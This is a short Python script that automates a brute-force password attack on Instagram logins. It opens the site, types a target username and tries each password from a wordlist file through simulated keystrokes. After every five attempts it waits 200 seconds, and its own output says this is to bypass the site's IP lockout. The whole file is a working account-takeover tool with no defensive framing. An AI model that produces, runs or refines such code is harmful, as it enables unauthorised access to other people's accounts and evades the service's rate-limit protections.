import pyautogui as pg
import webbrowser
import time 
user = input("Insert the User name: ")
print("REMEMBER TO EXIT OF ANY ACCOUNT LOGGED ON THIS DEVICE")
for i in range(0,4):
    print("EXECUTING IN " + str(i)+ "...")
    time.sleep(1)



print(""" _______      ___    ___ _______   ________  ___  ___  _________  ___  ________   ________                 
|\  ___ \    |\  \  /  /|\  ___ \ |\   ____\|\  \|\  \|\___   ___\\  \|\   ___  \|\   ____\                
\ \   __/|   \ \  \/  / | \   __/|\ \  \___|\ \  \\\  \|___ \  \_\ \  \ \  \\ \  \ \  \___|                
 \ \  \_|/__  \ \    / / \ \  \_|/_\ \  \    \ \  \\\  \   \ \  \ \ \  \ \  \\ \  \ \  \  ___              
  \ \  \_|\ \  /     \/   \ \  \_|\ \ \  \____\ \  \\\  \   \ \  \ \ \  \ \  \\ \  \ \  \|\  \ ___ ___ ___ 
   \ \_______\/  /\   \    \ \_______\ \_______\ \_______\   \ \__\ \ \__\ \__\\ \__\ \_______\\__\\__\\__\
        \|_______/__/ /\ __\    \|_______|\|_______|\|_______|    \|__|  \|__|\|__| \|__|\|_______\|__\|__\|__|
                  |__|/ \|__|                                                             """)


time.sleep(5)
webbrowser.open("www.instagram.com")
time.sleep(10)
f = open( r"wordlist.txt" )
cont = 0
for word in f:
    pg.moveTo(1300,380)
    pg.click()
    pg.write(user)
    print("password tried: " + word)
    pg.press("Tab")
    pg.write(word)
    pg.press("Enter")
    
    time.sleep(3)
    pg.press("f5")
    time.sleep(2.5)
    cont+=1
    if cont == 5:
        print("WAITING 200s TO BYPASS THE IP LOCKING...")
        time.sleep(200)
        pg.press("f5")
        cont = 0

    
